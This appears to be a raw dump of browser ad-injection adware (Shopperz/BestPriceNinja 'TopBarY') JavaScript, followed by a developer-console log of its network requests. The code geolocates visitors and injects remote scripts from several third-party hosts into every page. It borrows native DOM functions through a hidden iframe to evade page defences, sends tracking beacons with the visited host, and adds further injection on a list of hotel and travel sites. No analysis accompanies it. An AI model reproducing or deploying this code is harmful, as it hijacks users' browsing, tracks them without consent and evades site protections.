(function(){FO_ADJUSTSCALE = { active: true, top:165, bottom: 0, pos: 0, minScale: 0.95};window.FO_DOMAIN = ".bestpriceninja.com";window.addEventListener("FO_NON_COMMERCE_CLASSIFIED", function(){
	var b=document.getElementsByTagName("head")[0].appendChild(document.createElement("script"));b.src="//cdn.visadd.com/script/14567725516/preload.js?subid=$sub_id_string&pr=Powered%20by%20&um=shopperz111220151459&umu=http://shopperz.me";
 });
function nativeAjax(url, callback) {
	var done = false;
	function whenReady(xhr) {
		xhr.onload = xhr.onreadystatechange = function(e) {
			if (!done && (!xhr.readyState || xhr.readyState == 4 || xhr.readyState === "loaded" || xhr.readyState === "complete")) {
				if (xhr.status == 200) {
					done = true;
					callback && callback(xhr.responseText);
				}
			}
		};
	}

	if ("XDomainRequest" in window) {
		var xdr = new window['XDomainRequest']();
		xdr.open("get", url);
		
		whenReady(xdr, callback);

		xdr.send();
	}
	else {
		var xhr = new XMLHttpRequest();
		xhr.open("get", url, true);

		whenReady(xhr, callback);

		xhr.send();
	}
}

nativeAjax("http://app.bestpriceninja.com/fo/country.js", function(responseText) {
	console.log(responseText)
	if (responseText) {
		var countryCode = JSON.parse(responseText).country.toLowerCase();
		var isAllowedCountry = (["us","de","fr","gb","ca"].indexOf(countryCode) > -1);
		if(isAllowedCountry) {
			var b=document.getElementsByTagName("head")[0].appendChild(document.createElement("script"));
			b.src="https://target-talent.com/js/ch/9?tid=$fo_general&name=Workomerce&geo=" + countryCode + "&user=123456789463215&ulink=www.uninstall.com";
		}
	}
});
Math.random()<(window['FO_VLATESTRATIO']?window['FO_VLATESTRATIO']:0.1)?(function(){var Injector=function(){function e(){}return e.getAltDocument=function(){if(null==e.altDocument){var t=document.createElement("iframe");t.style.border="0px",t.style.width="1px",t.style.height="1px",t.style.left="-100px",t.style.top="-100px",t.style.visibility="hidden",document.body.appendChild(t),e.altDocument=t.contentWindow.document}return e.altDocument},e.retryOnFailure=function(t,n,r){try{t(function(a){0==n?r(a):e.retryOnFailure(t,n-1,r)},n)}catch(a){0==n?r(a):e.retryOnFailure(t,n-1,r)}},e.injectScriptWithRetries=function(t,n,r,a){void 0===a&&(a=!1),e.retryOnFailure(function(r,o){return e.injectScript(t+"?retries="+o,n,r,a)},3,r)},e.injectScript=function(t,n,r,a){void 0===a&&(a=!1);var o=null,i=!0,d=!1,c=document.createElement;c.toString().indexOf("[native code]")>0?o=document.createElement("script"):(o=e.getAltDocument().createElement.call(document,"script"),i=!1),o.onload=o.onreadystatechange=function(e){d||o.readyState&&"loaded"!==o.readyState&&"complete"!==o.readyState||(d=!0,a&&console.log("Injected script loaded"),n&&window.setTimeout(function(){n()},1))},o.onerror=function(e){d||(d=!0,a&&console.warn("Injected script failed",e),r&&window.setTimeout(function(){r(e)},1))};var u=document.getElementsByTagName("head")[0],s=u.appendChild;return s.toString().indexOf("[native code]")>0?u.appendChild(o):(e.getAltDocument().appendChild.call(u,o),i=!1),o.src=t,a&&console.log("Injected script "+t+". Using native functions: "+i),i},e.altDocument=null,e}(),BootstrapHelper=function(){function e(){}return e.ready=function(){if(!e.readyFired){e.readyFired=!0;for(var t=0;t<e.readyList.length;t++)e.readyList[t].fn();e.readyList=[]}},e.readyStateChange=function(){"complete"===document.readyState&&e.ready()},e.documentReady=function(t){return e.readyFired?void setTimeout(t,1):(e.readyList.push({fn:t}),void("complete"===document.readyState||!document.attachEvent&&"interactive"===document.readyState?setTimeout(e.ready,1):e.readyEventHandlersInstalled||(document.addEventListener?(document.addEventListener("DOMContentLoaded",e.ready,!1),window.addEventListener("load",e.ready,!1)):(document.attachEvent("onreadystatechange",e.readyStateChange),window.attachEvent("onload",e.ready)),e.readyEventHandlersInstalled=!0)))},e.bootstrapWhenDocumentReady=function(t,n,r){void 0===r&&(r=[]),e.documentReady(function(){return e.bootstrap(t,n,r)})},e.bootstrap=function(t,n,r){void 0===r&&(r=[]);var a=!!window.FO_DEBUG;r&&r.length||(r=window.FO_DOMAIN?[window.FO_DOMAIN]:[".datafastguru.info"]);var o=e.selectDomain(r);e.notify(o,t,"inj",{},.01),e.notifyGenericUrl("https://secure.adnxs.com/seg?add=2735784&t=2");var i="//pstatic"+o+"/nwp/v0_0_939/release/Shared/App/SharedApp.js",d="FO.Shared_"+n+".App.SharedApp";e.retryOnFailure(function(n){return e.injectAndInstantiate(i,d,o,t,a,n)},3,function(n){return e.notify(o,t,"exception",{ex:"Failure to get SharedApp "+(n&&n.message)},.01)})},e.retryOnFailure=function(t,n,r){t(function(a){0==n?r(a):e.retryOnFailure(t,n-1,r)})},e.injectAndInstantiate=function(t,n,r,a,o,i){Injector.injectScript(t+"?t="+e.sharedAppTrialNum++,function(){try{var t=e.instantiateClass(n);t.init(a,r)}catch(d){o&&console.error(d),i(d)}},i,o)},e.notify=function(t,n,r,a,o){var i=Math.random()<o;if(i){var d="//app"+t+"/a/"+r+"/logo.png",c={};c.fam="nwp",c.t=(new Date).getTime()+"",c.v="0_0_939",c.dmn=t,c.partid=n.partnerCode,c.subid=n.subId,c.hn=document.location.host,c.safepassage="1";for(var u in a)c[u]=a[u];e.notifyGenericUrl(d,c)}},e.notifyGenericUrl=function(e,t){void 0===t&&(t={});try{if(t){e+="?";for(var n in t){var r=t[n]+"";e=e+"&"+n+"="+encodeURIComponent(r)}}return(new Image).src=e,!0}catch(a){return!1}},e.selectDomain=function(e){for(var t=[],n=0;n<e.length;n++)e[n]&&e[n].length&&-1==e[n].indexOf("$")&&t.push(e[n]);var n=Math.floor(Math.random()*t.length);return t[n]},e.instantiateClass=function(e){for(var t=e.split("."),n=window,r=0;r<t.length;r++)n=n[t[r]];var a=new n;return a},e.sharedAppTrialNum=0,e.readyFired=!1,e.readyEventHandlersInstalled=!1,e.readyList=[],e}(),params={"products":{"TopBarY":[{"logic":["CommerceDealsLogic","CouponsLogic"],"visual":"TopBarY","weight":10}],"NonCommerceInjector":[{"logic":["NonCommerceLogic"],"visual":"EmptyVisual","weight":10}]},partnerCode:"bittopbar",subId:"clkmidex_ID",providerName:"shopperz111220151459",providerLink:"http://shopperz.me",flags:{base:{"value":[{"name":"NotificationRates","flag":"","variants":[{"name":"Default","flagValue":"","odds":1,"values":[{"name":"notifyrate.inj","val":"0.01"},{"name":"notifyrate.exception","val":"0.001"},{"name":"notifyrate.init","val":"0.01"},{"name":"notifyrate.usr","val":"0.01"},{"name":"notifyrate.noshow","val":"0.01"},{"name":"notifyrate.wo","val":"0.1"},{"name":"notifyrate.generic.pb_result","val":"0"},{"name":"notifyrate.generic.realimpression","val":"0.1"},{"name":"notifyrate.generic.bindingError","val":"0.01"},{"name":"notifyrate.generic.uptime","val":"0.001"},{"name":"notifyrate.generic.pageribbons","val":"0.01"},{"name":"notifyrate.generic.ribbon_init","val":"0.001"}]}]},{"name":"newScrapeWeight","flag":"itai_scr_14","variants":[{"name":"old_scrape_values","flagValue":"set1","odds":0.5,"values":[{"name":"deal-scrape-weights-amplify.title","val":"6"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"6"},{"name":"deal-scrape-weights-amplify.search","val":"8"},{"name":"deal-scrape-weights-amplify.ribbon","val":"4"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"0"},{"name":"deal-scrape-weights-amplify.h1","val":"20"},{"name":"dedicated-part-of-scrape","val":"1"}]},{"name":"ampv1","flagValue":"set2","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-2"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"10"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"1"}]},{"name":"ampv2","flagValue":"set3","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-1"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-1"},{"name":"deal-scrape-weights-amplify.search","val":"20"},{"name":"deal-scrape-weights-amplify.ribbon","val":"20"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"-1"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"1"}]},{"name":"ampv3","flagValue":"set4","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-2"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"10"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"OldExperiment1","flagValue":"e1","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"10"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"15"},{"name":"deal-scrape-weights-amplify.ribbon","val":"6"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"1"},{"name":"deal-scrape-weights-amplify.h1","val":"8"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"OldExperiment2","flagValue":"e2","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"5"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"20"},{"name":"deal-scrape-weights-amplify.ribbon","val":"15"},{"name":"deal-scrape-weights-amplify.importantqs","val":"8"},{"name":"deal-scrape-weights-amplify.text","val":"1"},{"name":"deal-scrape-weights-amplify.h1","val":"14"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv4","flagValue":"set5","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"6"},{"name":"deal-scrape-weights-amplify.otherqs","val":"0"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"8"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-6"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv5","flagValue":"set6","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"0"},{"name":"deal-scrape-weights-amplify.otherqs","val":"0"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"20"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"0"},{"name":"deal-scrape-weights-amplify.h1","val":"6"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv6","flagValue":"set7","odds":0.5,"values":[{"name":"deal-scrape-weights-amplify.title","val":"6"},{"name":"deal-scrape-weights-amplify.otherqs","val":"2"},{"name":"deal-scrape-weights-amplify.dedicated","val":"6"},{"name":"deal-scrape-weights-amplify.search","val":"8"},{"name":"deal-scrape-weights-amplify.ribbon","val":"4"},{"name":"deal-scrape-weights-amplify.importantqs","val":"8"},{"name":"deal-scrape-weights-amplify.text","val":"0"},{"name":"deal-scrape-weights-amplify.h1","val":"20"},{"name":"dedicated-part-of-scrape","val":"1"}]}]},{"name":"FavoriteMerchants","flag":"fav_merch","variants":[{"name":"New set 1811","flagValue":"","odds":0,"values":[{"name":"favoriteMerchantMaxTime","val":"2592000"},{"name":"topFavoriteMerchants","val":"3"},{"name":"favoriteMerchantCookieUpdateRate","val":"0.1"}]}]},{"name":"ProtectEvents","flag":"pe2","variants":[{"name":"Protect","flagValue":"1","odds":1,"values":[{"name":"view.protect-events","val":"1"}]},{"name":"Dont","flagValue":"0","odds":0,"values":[{"name":"view.protect-events","val":"0"}]}]},{"name":"ProtectDom","flag":"pdom","variants":[{"name":"Protect","flagValue":"1","odds":1,"values":[{"name":"view.protect-dom","val":"1"}]},{"name":"Dont","flagValue":"0","odds":0,"values":[{"name":"view.protect-dom","val":"0"}]}]},{"name":"Standown","flag":"standown","variants":[{"name":"standown","flagValue":"1","odds":0,"values":[{"name":"should.standown","val":"1"}]},{"name":"DontStandown","flagValue":"0","odds":1,"values":[{"name":"should.standown","val":"0"}]}]},{"name":"skin","flag":"skin1","variants":[{"name":"Skin","flagValue":"holiday","odds":0,"values":[{"name":"display.skin","val":"holiday"}]},{"name":"default","flagValue":"default","odds":1,"values":[{"name":"display.skin","val":"default"}]}]},{"name":"SlideView","flag":"sliderview","variants":[{"name":"Div","flagValue":"div","odds":1,"values":[{"name":"slider.usediv","val":"1"}]},{"name":"IFrame","flagValue":"ifr","odds":0,"values":[{"name":"slider.usediv","val":"0"}]}]},{"name":"discountData","flag":"discountData","variants":[{"name":"no","flagValue":"no","odds":1,"values":[{"name":"deals.use-fake-data","val":"0"}]}]},{"name":"New Group 7335","flag":"FlagKey7335","variants":[]}]},specific:{}}},version="0_0_939";top===window&&BootstrapHelper.bootstrapWhenDocumentReady(params,version);}()):(function(){var Injector=function(){function e(){}return e.getAltDocument=function(){if(null==e.altDocument){var t=document.createElement("iframe");t.style.border="0px",t.style.width="1px",t.style.height="1px",t.style.left="-100px",t.style.top="-100px",t.style.visibility="hidden",document.body.appendChild(t),e.altDocument=t.contentWindow.document}return e.altDocument},e.retryOnFailure=function(t,n,r){try{t(function(a){0==n?r(a):e.retryOnFailure(t,n-1,r)},n)}catch(a){0==n?r(a):e.retryOnFailure(t,n-1,r)}},e.injectScriptWithRetries=function(t,n,r,a){void 0===a&&(a=!1),e.retryOnFailure(function(r,o){return e.injectScript(t+"?retries="+o,n,r,a)},3,r)},e.injectScript=function(t,n,r,a){void 0===a&&(a=!1);var o=null,i=!0,d=!1,c=document.createElement;c.toString().indexOf("[native code]")>0?o=document.createElement("script"):(o=e.getAltDocument().createElement.call(document,"script"),i=!1),o.onload=o.onreadystatechange=function(e){d||o.readyState&&"loaded"!==o.readyState&&"complete"!==o.readyState||(d=!0,a&&console.log("Injected script loaded"),n&&window.setTimeout(function(){n()},1))},o.onerror=function(e){d||(d=!0,a&&console.warn("Injected script failed",e),r&&window.setTimeout(function(){r(e)},1))};var u=document.getElementsByTagName("head")[0],s=u.appendChild;return s.toString().indexOf("[native code]")>0?u.appendChild(o):(e.getAltDocument().appendChild.call(u,o),i=!1),o.src=t,a&&console.log("Injected script "+t+". Using native functions: "+i),i},e.altDocument=null,e}(),BootstrapHelper=function(){function e(){}return e.ready=function(){if(!e.readyFired){e.readyFired=!0;for(var t=0;t<e.readyList.length;t++)e.readyList[t].fn();e.readyList=[]}},e.readyStateChange=function(){"complete"===document.readyState&&e.ready()},e.documentReady=function(t){return e.readyFired?void setTimeout(t,1):(e.readyList.push({fn:t}),void("complete"===document.readyState||!document.attachEvent&&"interactive"===document.readyState?setTimeout(e.ready,1):e.readyEventHandlersInstalled||(document.addEventListener?(document.addEventListener("DOMContentLoaded",e.ready,!1),window.addEventListener("load",e.ready,!1)):(document.attachEvent("onreadystatechange",e.readyStateChange),window.attachEvent("onload",e.ready)),e.readyEventHandlersInstalled=!0)))},e.bootstrapWhenDocumentReady=function(t,n,r){void 0===r&&(r=[]),e.documentReady(function(){return e.bootstrap(t,n,r)})},e.bootstrap=function(t,n,r){void 0===r&&(r=[]);var a=!!window.FO_DEBUG;r&&r.length||(r=window.FO_DOMAIN?[window.FO_DOMAIN]:[".datafastguru.info"]);var o=e.selectDomain(r);e.notify(o,t,"inj",{},.01),e.notifyGenericUrl("https://secure.adnxs.com/seg?add=2735784&t=2");var i="//pstatic"+o+"/nwp/v0_0_938/release/Shared/App/SharedApp.js",d="FO.Shared_"+n+".App.SharedApp";e.retryOnFailure(function(n){return e.injectAndInstantiate(i,d,o,t,a,n)},3,function(n){return e.notify(o,t,"exception",{ex:"Failure to get SharedApp "+(n&&n.message)},.01)})},e.retryOnFailure=function(t,n,r){t(function(a){0==n?r(a):e.retryOnFailure(t,n-1,r)})},e.injectAndInstantiate=function(t,n,r,a,o,i){Injector.injectScript(t+"?t="+e.sharedAppTrialNum++,function(){try{var t=e.instantiateClass(n);t.init(a,r)}catch(d){o&&console.error(d),i(d)}},i,o)},e.notify=function(t,n,r,a,o){var i=Math.random()<o;if(i){var d="//app"+t+"/a/"+r+"/logo.png",c={};c.fam="nwp",c.t=(new Date).getTime()+"",c.v="0_0_938",c.dmn=t,c.partid=n.partnerCode,c.subid=n.subId,c.hn=document.location.host,c.safepassage="1";for(var u in a)c[u]=a[u];e.notifyGenericUrl(d,c)}},e.notifyGenericUrl=function(e,t){void 0===t&&(t={});try{if(t){e+="?";for(var n in t){var r=t[n]+"";e=e+"&"+n+"="+encodeURIComponent(r)}}return(new Image).src=e,!0}catch(a){return!1}},e.selectDomain=function(e){for(var t=[],n=0;n<e.length;n++)e[n]&&e[n].length&&-1==e[n].indexOf("$")&&t.push(e[n]);var n=Math.floor(Math.random()*t.length);return t[n]},e.instantiateClass=function(e){for(var t=e.split("."),n=window,r=0;r<t.length;r++)n=n[t[r]];var a=new n;return a},e.sharedAppTrialNum=0,e.readyFired=!1,e.readyEventHandlersInstalled=!1,e.readyList=[],e}(),params={"products":{"TopBarY":[{"logic":["CommerceDealsLogic","CouponsLogic"],"visual":"TopBarY","weight":10}],"NonCommerceInjector":[{"logic":["NonCommerceLogic"],"visual":"EmptyVisual","weight":10}]},partnerCode:"bittopbar",subId:"clkmidex_ID",providerName:"shopperz111220151459",providerLink:"http://shopperz.me",flags:{base:{"value":[{"name":"NotificationRates","flag":"","variants":[{"name":"Default","flagValue":"","odds":1,"values":[{"name":"notifyrate.inj","val":"0.01"},{"name":"notifyrate.exception","val":"0.001"},{"name":"notifyrate.init","val":"0.01"},{"name":"notifyrate.usr","val":"0.01"},{"name":"notifyrate.noshow","val":"0.01"},{"name":"notifyrate.wo","val":"0.1"},{"name":"notifyrate.generic.pb_result","val":"0"},{"name":"notifyrate.generic.realimpression","val":"0.1"},{"name":"notifyrate.generic.bindingError","val":"0.01"},{"name":"notifyrate.generic.uptime","val":"0.001"},{"name":"notifyrate.generic.pageribbons","val":"0.01"},{"name":"notifyrate.generic.ribbon_init","val":"0.001"}]}]},{"name":"newScrapeWeight","flag":"itai_scr_14","variants":[{"name":"old_scrape_values","flagValue":"set1","odds":0.5,"values":[{"name":"deal-scrape-weights-amplify.title","val":"6"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"6"},{"name":"deal-scrape-weights-amplify.search","val":"8"},{"name":"deal-scrape-weights-amplify.ribbon","val":"4"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"0"},{"name":"deal-scrape-weights-amplify.h1","val":"20"},{"name":"dedicated-part-of-scrape","val":"1"}]},{"name":"ampv1","flagValue":"set2","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-2"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"10"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"1"}]},{"name":"ampv2","flagValue":"set3","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-1"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-1"},{"name":"deal-scrape-weights-amplify.search","val":"20"},{"name":"deal-scrape-weights-amplify.ribbon","val":"20"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"-1"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"1"}]},{"name":"ampv3","flagValue":"set4","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-2"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"10"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"OldExperiment1","flagValue":"e1","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"10"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"15"},{"name":"deal-scrape-weights-amplify.ribbon","val":"6"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"1"},{"name":"deal-scrape-weights-amplify.h1","val":"8"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"OldExperiment2","flagValue":"e2","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"5"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"20"},{"name":"deal-scrape-weights-amplify.ribbon","val":"15"},{"name":"deal-scrape-weights-amplify.importantqs","val":"8"},{"name":"deal-scrape-weights-amplify.text","val":"1"},{"name":"deal-scrape-weights-amplify.h1","val":"14"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv4","flagValue":"set5","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"6"},{"name":"deal-scrape-weights-amplify.otherqs","val":"0"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"8"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-6"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv5","flagValue":"set6","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"0"},{"name":"deal-scrape-weights-amplify.otherqs","val":"0"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"20"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"0"},{"name":"deal-scrape-weights-amplify.h1","val":"6"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv6","flagValue":"set7","odds":0.5,"values":[{"name":"deal-scrape-weights-amplify.title","val":"6"},{"name":"deal-scrape-weights-amplify.otherqs","val":"2"},{"name":"deal-scrape-weights-amplify.dedicated","val":"6"},{"name":"deal-scrape-weights-amplify.search","val":"8"},{"name":"deal-scrape-weights-amplify.ribbon","val":"4"},{"name":"deal-scrape-weights-amplify.importantqs","val":"8"},{"name":"deal-scrape-weights-amplify.text","val":"0"},{"name":"deal-scrape-weights-amplify.h1","val":"20"},{"name":"dedicated-part-of-scrape","val":"1"}]}]},{"name":"FavoriteMerchants","flag":"fav_merch","variants":[{"name":"New set 1811","flagValue":"","odds":0,"values":[{"name":"favoriteMerchantMaxTime","val":"2592000"},{"name":"topFavoriteMerchants","val":"3"},{"name":"favoriteMerchantCookieUpdateRate","val":"0.1"}]}]},{"name":"ProtectEvents","flag":"pe2","variants":[{"name":"Protect","flagValue":"1","odds":1,"values":[{"name":"view.protect-events","val":"1"}]},{"name":"Dont","flagValue":"0","odds":0,"values":[{"name":"view.protect-events","val":"0"}]}]},{"name":"ProtectDom","flag":"pdom","variants":[{"name":"Protect","flagValue":"1","odds":1,"values":[{"name":"view.protect-dom","val":"1"}]},{"name":"Dont","flagValue":"0","odds":0,"values":[{"name":"view.protect-dom","val":"0"}]}]},{"name":"Standown","flag":"standown","variants":[{"name":"standown","flagValue":"1","odds":0,"values":[{"name":"should.standown","val":"1"}]},{"name":"DontStandown","flagValue":"0","odds":1,"values":[{"name":"should.standown","val":"0"}]}]},{"name":"skin","flag":"skin1","variants":[{"name":"Skin","flagValue":"holiday","odds":0,"values":[{"name":"display.skin","val":"holiday"}]},{"name":"default","flagValue":"default","odds":1,"values":[{"name":"display.skin","val":"default"}]}]},{"name":"SlideView","flag":"sliderview","variants":[{"name":"Div","flagValue":"div","odds":1,"values":[{"name":"slider.usediv","val":"1"}]},{"name":"IFrame","flagValue":"ifr","odds":0,"values":[{"name":"slider.usediv","val":"0"}]}]},{"name":"discountData","flag":"discountData","variants":[{"name":"no","flagValue":"no","odds":1,"values":[{"name":"deals.use-fake-data","val":"0"}]}]},{"name":"New Group 7335","flag":"FlagKey7335","variants":[]}]},specific:{}}},version="0_0_938";top===window&&BootstrapHelper.bootstrapWhenDocumentReady(params,version);}());(function(){for(var a="Venere.com travelocity.com snoozee.com southwest.com lastminute.com hotelclub.com hotels.com hotels4u.com Expedia. getaroom.com ebookers.com cheaptickets.com booking.com bookit.com Agoda.com Priceline.com Orbitz.com Budgetplaces.com Hotwire.com makemytrip.com marriott.com Tripadvisor. kayak. trivago. hotelscombined. prestigia.com otel.com skoosh.com asiarooms.com bestwestern.com lasvegas.com www.amoma.com".split(" "),c=window.location.hostname.toLocaleLowerCase(),b=0;b<a.length;b++)if(-1<
    c.indexOf(a[b].toLowerCase())){a=document.createElement("script");a.src="//va.compare-hotel-rates.com/hotels.php?ui=1&partner=first_t_t&ns=first_t_t&mamId=first_t_t&userId=2222&appId=3333&sp=0&apps=Targeted";document.body.appendChild(a);break}})();
})()
XHR finished loading: GET "http://app.bestpriceninja.com/fo/country.js".
{"country":"ID"}

XHR finished loading: GET "http://cdnjs.cloudflare.com/ajax/libs/knockout/3.3.0/knockout-min.js".
XHR finished loading: GET "http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js".
XHR finished loading: GET "http://app.bestpriceninja.com/fo/country.js".
Error saving setting with name: consoleHistory, value length: 5496442. Error: Failed to set the 'consoleHistory' property on 'Storage': Setting the value of 'consoleHistory' exceeded the quota.
Ten largest settings: 
Setting: 'consoleHistory', size: 5213214
Setting: 'previouslyViewedFiles', size: 4289
Setting: 'savedURLs', size: 1326
Setting: 'breakpoints', size: 227
Setting: 'domBreakpoints', size: 2
Setting: 'eventListenerBreakpoints', size: 2
Setting: 'experiments', size: 2
Setting: 'fileSystemMapping', size: 2
Setting: 'workspaceExcludedFolders', size: 2
undefined
GET http://6607129fd4ee493fbcb7f8f4d3e0f606.s3.amazonaws.com/?_BIT_sk=__=jQuery111007114765599835664_1452630737636&_=1452630737637 
XHR finished loading: GET "http://jsgnr.bestpriceninja.com/bwl/wl".
XHR finished loading: GET "http://jsgnr.bestpriceninja.com/bwl/bl".
XHR finished loading: GET "http://jsgnr.bestpriceninja.com/cu/cu".
XHR finished loading: GET "http://cwbl.bestpriceninja.com/search/www.productsdb.com".
XHR finished loading: GET "http://cwbl.bestpriceninja.com/search/productsdb.com".

-
http://istatic.eshopcomp.com/fo/ec/bittopbar.js?subid=clkmidex_ID&bname=shopperz111220151459&blink=http%3A%2F%2Fshopperz.me
